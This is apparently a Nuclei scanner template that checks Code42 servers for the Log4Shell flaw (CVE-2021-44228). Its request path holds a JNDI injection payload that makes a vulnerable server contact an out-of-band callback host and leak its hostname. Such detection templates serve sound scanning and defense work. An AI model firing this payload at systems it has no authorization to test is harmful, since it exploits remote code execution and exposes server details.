http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost'
id: code42-log4j-rce
info:
  author: Adam Crosser
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Multiple Code42 components are impacted by the logj4 vulnerability.
    Affected Code42 components include:

    - Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022

    - Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans:
    Updated Log4j from 2.16.0 to 2.17.1 on January 18, 2022

    - Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February
    2, 2022

    - On-premises Code42 server: Mitigated from Log4j vulnerabilities by following
    these steps

    - On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021

    '
  metadata:
    max-request: 1
  name: Apache Code42 - Remote Code Execution (Apache Log4j)
  reference:
  - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: cve,cve2021,jndi,log4j,rce,oast,code42,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
